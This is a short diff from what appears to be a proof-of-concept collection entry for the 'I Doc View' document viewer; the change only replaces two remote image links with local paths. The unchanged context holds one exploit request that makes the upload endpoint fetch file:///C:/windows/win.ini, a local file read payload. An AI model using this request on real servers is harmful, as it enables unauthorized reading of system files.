@@ -13,6 +13,6 @@ title="I Doc View"
 ```
 http://xxxxxx/doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt
 ```
-![image](https://github.com/wy876/POC/assets/139549762/01f5a3a7-9cd3-45bc-beb0-5cd6ab800171)
+![image](../../images/01f5a3a7-9cd3-45bc-beb0-5cd6ab800171.png)
 
-![image](https://github.com/wy876/POC/assets/139549762/0e549cdd-9c98-41b5-874d-8a159cf3db19)
+![image](../../images/0e549cdd-9c98-41b5-874d-8a159cf3db19.png)
